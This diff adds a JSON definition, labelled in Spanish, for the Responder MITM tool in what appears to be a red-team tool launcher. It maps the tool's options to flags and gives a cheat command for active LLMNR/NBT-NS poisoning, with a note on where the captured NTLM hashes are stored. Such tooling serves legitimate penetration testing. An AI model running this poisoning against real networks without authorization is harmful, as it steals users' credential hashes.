@@ -1,0 +1,13 @@
+{
+ "id":"responder","name":"Responder","category":"Red / MITM","binary":"responder",
+ "summary":"Envenena peticiones LLMNR/NBT-NS/MDNS para capturar hashes NTLM en red Windows.",
+ "questions":[
+  {"id":"I","type":"text","label":"Interfaz de red","flag":"-I {v}","placeholder":"eth0","required":true},
+  {"id":"analyze","type":"bool","label":"Solo analizar (sin envenenar)","flag":"-A","help":"Útil para ver tráfico sin generar ruido en el primer intento."},
+  {"id":"wpad","type":"bool","label":"Activar servidor WPAD","flag":"-w","default":true},
+  {"id":"force_wins","type":"bool","label":"Forzar NBT-NS","flag":"-f"}
+ ],
+ "cheats":[
+  {"title":"Modo análisis (pasivo)","cmd":"sudo responder -I eth0 -A"},
+  {"title":"Envenenamiento activo","cmd":"sudo responder -I eth0 -wf","note":"Hashes capturados en /usr/share/responder/logs/"}
+ ]}
